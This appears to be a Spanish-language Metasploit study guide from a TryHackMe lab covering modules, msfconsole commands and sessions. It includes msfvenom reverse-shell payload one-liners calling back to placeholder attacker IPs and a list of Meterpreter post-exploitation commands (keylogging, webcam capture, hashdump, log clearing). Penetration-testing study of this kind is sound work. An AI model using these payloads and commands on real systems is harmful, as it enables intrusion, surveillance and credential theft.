# Metasploit Framework

## Versiones Principales

Metasploit tiene dos versiones principales:

- **Metasploit Pro**: La versión comercial que facilita la automatización y gestión de tareas, con una interfaz gráfica de usuario (GUI).
- **Metasploit Framework**: La versión de código abierto que se utiliza desde la línea de comandos. Es la más común en distribuciones de Linux orientadas a pruebas de penetración y es la que se abordará en esta guía.

El **Metasploit Framework** es una colección de herramientas que permiten la recolección de información, escaneo, explotación, desarrollo de exploits, post-explotación y mucho más. Aunque su uso principal se enfoca en pruebas de penetración, también es útil para investigación de vulnerabilidades y desarrollo de exploits.

---

## Conceptos Básicos

Antes de explorar los módulos, es útil entender algunos conceptos clave:

- **Vulnerabilidad**: Un fallo de diseño, código o lógica en el sistema objetivo. La explotación de una vulnerabilidad puede resultar en la divulgación de información confidencial o en la ejecución de código en el sistema objetivo.
- **Exploit**: Código que aprovecha una vulnerabilidad en el sistema objetivo.
- **Payload**: El código que se ejecutará en el sistema objetivo tras la explotación de una vulnerabilidad, como ganar acceso al sistema o leer información confidencial.

---

## Módulos en Metasploit

1. **Auxiliary**: Complementa el proceso de explotación, incluyendo escaneos y ataques de fuerza bruta.
2. **Encoders**: Codifica el payload para evitar ser detectado por software de seguridad.
3. **Evasion**: Ayuda a evadir las defensas del sistema objetivo.
4. **Exploits**: Código que aprovecha una vulnerabilidad en el sistema objetivo.
5. **NOPs**: Instrucciones "No Operation" que llenan espacio y alinean el exploit.
6. **Payloads**: Existen varios tipos de payloads:
   - **Adapters**: Envolven payloads en diferentes formatos, como comandos de PowerShell.
   - **Singles**: Payloads independientes que no necesitan descargar componentes adicionales (por ejemplo, agregar un usuario o lanzar una aplicación).
   - **Stagers**: Establecen un canal de comunicación entre Metasploit y el sistema objetivo, permitiendo enviar payloads en etapas. El tamaño del payload inicial es más pequeño, lo cual ayuda a evitar la detección.
   - **Stages**: Payloads de mayor tamaño que se descargan y ejecutan tras establecerse la conexión inicial mediante el stager.
7. **Post**: Módulos utilizados después de la explotación para realizar acciones en el sistema comprometido.

---

## Comandos Principales

- **`use`**: Selecciona un módulo.
  - Ejemplo:
    ```bash
    use exploit/windows/smb/ms17_010_eternalblue
    ```
- **`show options`**: Muestra las opciones disponibles para el módulo seleccionado.
- **`back`**: Regresa al menú anterior.
- **`info`**: Muestra información sobre el módulo actual.
- **`search`**: Busca un módulo específico.
  - La salida del comando `search` muestra una lista de módulos con información como el tipo (auxiliary, exploit, etc.) y la categoría (scanner, admin, windows, unix, etc.).
  - Puedes seleccionar cualquier módulo encontrado con el comando `use` seguido del número de la línea de resultado.
    - Ejemplo:
      ```bash
      use 0  # En lugar de usar "use auxiliary/admin/smb/ms17_010_command"
      ```

---

![Metasploit Modules](https://github.com/MC-19/Upgrade-Hub/blob/main/TryHackMe/Rooms/a88c8d37283878e01447853a68578deb.png)


## Tipos de Prompts en Metasploit

Al trabajar con Metasploit, es importante entender los diferentes tipos de prompts que encontrarás:

1. **Command Prompt Regular**: 
   - No puedes usar comandos de Metasploit aquí. Es el terminal estándar del sistema operativo.

2. **msfconsole Prompt**: 
   - Aparece como `msf6` (o `msf5` dependiendo de la versión instalada). En este prompt, no se establece un contexto específico, por lo que no puedes usar comandos específicos para establecer parámetros y ejecutar módulos.

3. **Context Prompt**: 
   - Una vez que decides usar un módulo y ejecutas el comando `set` para seleccionarlo, el prompt de `msfconsole` mostrará el contexto. Aquí puedes usar comandos específicos del contexto (por ejemplo, `set RHOSTS 10.10.x.x`).

4. **Meterpreter Prompt**: 
   - Meterpreter es un payload importante que se verá en detalle más adelante. Este prompt significa que un agente de Meterpreter se ha cargado en el sistema objetivo y se ha conectado de regreso a ti. Puedes usar comandos específicos de Meterpreter aquí.

5. **Shell en el Sistema Objetivo**: 
   - Una vez que se completa la explotación, puedes tener acceso a un shell de comandos en el sistema objetivo. Este es un comando regular, y todos los comandos escritos aquí se ejecutan en el sistema objetivo.

---

## Comando `show options`

El comando `show options` lista todos los parámetros disponibles para el módulo seleccionado. Aquí tienes un ejemplo del uso del comando en un módulo de explotación:


# Uso de Metasploit para Explotar Vulnerabilidades

## Configuración de Parámetros del Módulo

Como se puede ver en la captura de pantalla anterior, algunos de estos parámetros requieren un valor para que el exploit funcione. Algunos valores de parámetros requeridos se pre-poblarán, asegúrate de verificar si deben permanecer igual para tu objetivo. Por ejemplo, un exploit web podría tener un valor de RPORT (puerto remoto: el puerto en el sistema objetivo al que Metasploit intentará conectarse y ejecutar el exploit) preestablecido en 80, pero tu aplicación web objetivo podría estar usando el puerto 8080.



Los parámetros que usarás con frecuencia son:

- **RHOSTS**: “Host remoto”, la dirección IP del sistema objetivo. Se puede establecer una sola dirección IP o un rango de red. Esto soportará la notación CIDR (Classless Inter-Domain Routing) (/24, /16, etc.) o un rango de red (10.10.10.x – 10.10.10.y). También puedes usar un archivo donde se enumeran los objetivos, un objetivo por línea utilizando `file:/path/of/the/target_file.txt`, como se muestra a continuación.

- **RPORT**: “Puerto remoto”, el puerto en el sistema objetivo en el que se está ejecutando la aplicación vulnerable.

- **PAYLOAD**: La carga útil que utilizarás con el exploit.

- **LHOST**: “Localhost”, la dirección IP de la máquina atacante (tu AttackBox o Kali Linux).

- **LPORT**: “Puerto local”, el puerto que utilizarás para que la shell reversa se conecte de vuelta. Este es un puerto en tu máquina atacante, y puedes establecerlo en cualquier puerto que no esté siendo utilizado por otra aplicación.

- **SESSION**: Cada conexión establecida al sistema objetivo utilizando Metasploit tendrá un ID de sesión. Utilizarás esto con los módulos de post-explotación que se conectarán al sistema objetivo usando una conexión existente.

Puedes sobrescribir cualquier parámetro configurado usando el comando `set` nuevamente con un valor diferente. También puedes borrar cualquier valor de parámetro usando el comando `unset` o borrar todos los parámetros establecidos con el comando `unset all`. 



Puedes usar el comando `setg` para establecer valores que se usarán para todos los módulos. El comando `setg` se usa de la misma manera que el comando `set`. La diferencia es que si usas el comando `set` para establecer un valor usando un módulo y cambias a otro módulo, tendrás que establecer el valor nuevamente. El comando `setg` te permite establecer el valor para que se use por defecto en diferentes módulos. Puedes borrar cualquier valor establecido con `setg` usando `unsetg`.

El ejemplo a continuación usa el siguiente flujo:

1. Usamos el exploit `ms17_010_eternalblue`.
2. Establecemos la variable `RHOSTS` usando el comando `setg` en lugar del comando `set`.
3. Usamos el comando `back` para salir del contexto del exploit.
4. Usamos un módulo auxiliar (este módulo es un escáner para descubrir vulnerabilidades de MS17-010).
5. El comando `show options` muestra que el parámetro `RHOSTS` ya está poblado con la dirección IP del sistema objetivo.



El comando `setg` establece un valor global que se utilizará hasta que salgas de Metasploit o lo borres utilizando el comando `unsetg`.

## Uso de Módulos

Una vez que se hayan configurado todos los parámetros del módulo, puedes lanzar el módulo utilizando el comando `exploit`. Metasploit también admite el comando `run`, que es un alias creado para el comando `exploit`, ya que la palabra `exploit` no tiene sentido cuando se utilizan módulos que no son exploits (escaners de puertos, escáneres de vulnerabilidades, etc.).

El comando `exploit` se puede usar sin ningún parámetro o utilizando el parámetro “-z”.

El comando `exploit -z` ejecutará el exploit y enviará la sesión a segundo plano tan pronto como se abra. Esto te devolverá al aviso de contexto desde el que ejecutaste el exploit.



This will return you the context prompt from which you have run the exploit.

Algunos módulos admiten la opción `check`. Esto verificará si el sistema objetivo es vulnerable sin explotarlo.

## Sesiones

Una vez que se ha explotado con éxito una vulnerabilidad, se creará una sesión. Este es el canal de comunicación establecido entre el sistema objetivo y Metasploit.

Puedes usar el comando `background` para enviar la sesión a segundo plano y regresar al aviso de `msfconsole`.



Alternativamente, se puede usar `CTRL+Z` para enviar sesiones a segundo plano.

El comando `sessions` se puede utilizar desde el aviso de `msfconsole` o cualquier contexto para ver las sesiones existentes.



Para interactuar con cualquier sesión, puedes usar el comando `sessions -i` seguido del número de sesión deseado.



# Comandos y Explicaciones

1. **`search portscan`**
   - Lista los módulos de escaneo de puertos disponibles en Metasploit.

2. **`set CONCURRENCY <valor>`**
   - Establece el número de objetivos que se escanearán simultáneamente.

3. **`set PORTS <rango>`**
   - Define el rango de puertos a escanear (ej. `1-10000`).

4. **`set RHOSTS <objetivo>`**
   - Especifica el objetivo o la red objetivo a escanear.

5. **`set THREADS <valor>`**
   - Establece el número de hilos que se utilizarán simultáneamente para acelerar el escaneo.

6. **`scanner/discovery/udp_sweep`**
   - Módulo que permite identificar rápidamente servicios que se ejecutan sobre UDP.

7. **`smb_enumshares`**
   - Módulo que permite enumerar los recursos compartidos en un sistema SMB.

8. **`systemctl start postgresql`**
   - Inicia la base de datos PostgreSQL que utiliza Metasploit.

9. **`msfdb init`**
   - Inicializa la base de datos de Metasploit.

10. **`msfconsole`**
    - Inicia la consola de Metasploit.

11. **`db_status`**
    - Verifica el estado de la base de datos en Metasploit.

12. **`workspace`**
    - Lista los espacios de trabajo disponibles.

13. **`workspace -a <nombre>`**
    - Agrega un nuevo espacio de trabajo.

14. **`workspace -d <nombre>`**
    - Elimina un espacio de trabajo existente.

15. **`db_nmap <objetivo>`**
    - Realiza un escaneo Nmap y guarda los resultados en la base de datos de Metasploit.

16. **`hosts`**
    - Muestra información sobre los hosts almacenados en la base de datos.

17. **`services`**
    - Muestra información sobre los servicios en los hosts almacenados.

18. **`hosts -R`**
    - Añade la información del host a los parámetros de RHOSTS.

19. **`use auxiliary/scanner/smb/smb_ms17_010`**
    - Utiliza el módulo de escaneo de vulnerabilidades MS17-010.

20. **`show options`**
    - Muestra las opciones configuradas para el módulo activo.

21. **`run` o `exploit`**
    - Lanza el exploit o ejecuta el módulo activo.
   
22. **`info`
    - You can use the info command for any module to have a better understanding of its use and purpose.

22. **`vnc_login`
    - can help us find login details for the VNC service.

23. **`Msfvenom`
    - allows you to generate payloads.
   
24. **`msfvenom --list formats`
    - You can either generate stand-alone payloads (e.g. a Windows executable for Meterpreter) or get a usable raw format (e.g. python).

25. **`Linux Executable and Linkable Forma`
    - `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf`
   
26. **`Windows`
    - `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe`

27. **`PHP`
    - `msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php`

28. **`ASP`
    - `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp`

29. **`Python`
    - `msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py`

Typing help on any Meterpreter session (shown by meterpreter> at the prompt) will list all available commands.


The
Meterpreter
help menu
meterpreter > help

Core Commands
=============

    Command                   Description
    -------                   -----------
    ?                         Help menu
    background                Backgrounds the current session
    bg                        Alias for background
    bgkill                    Kills a background meterpreter script
    bglist                    Lists running background scripts
    bgrun                     Executes a meterpreter script as a background thread
    channel                   Displays information or control active channels
    close                     Closes a channel[...]

Every version of Meterpreter will have different command options, so running the help command is always a good idea. Commands are built-in tools available on Meterpreter. They will run on the target system without loading any additional script or executable files.


Meterpreter will provide you with three primary categories of tools;

Built-in commands
Meterpreter tools
Meterpreter scripting
If you run the help command, you will see Meterpreter commands are listed under different categories.

Core commands
File system commands
Networking commands
System commands
User interface commands
Webcam commands
Audio output commands
Elevate commands
Password database commands
Timestomp commands
Please note that the list above was taken from the output of the help command on the Windows version of Meterpreter (windows/x64/meterpreter/reverse_tcp). These will be different for other Meterpreter versions.


Meterpreter commands

Core commands will be helpful to navigate and interact with the target system. Below are some of the most commonly used. Remember to check all available commands running the help command once a Meterpreter session has started.

Core commands
background: Backgrounds the current session
exit: Terminate the Meterpreter session
guid: Get the session GUID (Globally Unique Identifier)
help: Displays the help menu
info: Displays information about a Post module
irb: Opens an interactive Ruby shell on the current session
load: Loads one or more Meterpreter extensions
migrate: Allows you to migrate Meterpreter to another process
run: Executes a Meterpreter script or Post module
sessions: Quickly switch to another session
File system commands

cd: Will change directory
ls: Will list files in the current directory (dir will also work)
pwd: Prints the current working directory
edit: will allow you to edit a file
cat: Will show the contents of a file to the screen
rm: Will delete the specified file
search: Will search for files
upload: Will upload a file or directory
download: Will download a file or directory
Networking commands

arp: Displays the host ARP (Address Resolution Protocol) cache
ifconfig: Displays network interfaces available on the target system
netstat: Displays the network connections
portfwd: Forwards a local port to a remote service
route: Allows you to view and modify the routing table
System commands

clearev: Clears the event logs
execute: Executes a command
getpid: Shows the current process identifier
getuid: Shows the user that Meterpreter is running as
kill: Terminates a process
pkill: Terminates processes by name
ps: Lists running processes
reboot: Reboots the remote computer
shell: Drops into a system command shell
shutdown: Shuts down the remote computer
sysinfo: Gets information about the remote system, such as OS
Others Commands (these will be listed under different menu categories in the help menu)

idletime: Returns the number of seconds the remote user has been idle
keyscan_dump: Dumps the keystroke buffer
keyscan_start: Starts capturing keystrokes
keyscan_stop: Stops capturing keystrokes
screenshare: Allows you to watch the remote user's desktop in real time
screenshot: Grabs a screenshot of the interactive desktop
record_mic: Records audio from the default microphone for X seconds
webcam_chat: Starts a video chat
webcam_list: Lists webcams
webcam_snap: Takes a snapshot from the specified webcam
webcam_stream: Plays a video stream from the specified webcam
getsystem: Attempts to elevate your privilege to that of local system
hashdump: Dumps the contents of the SAM database

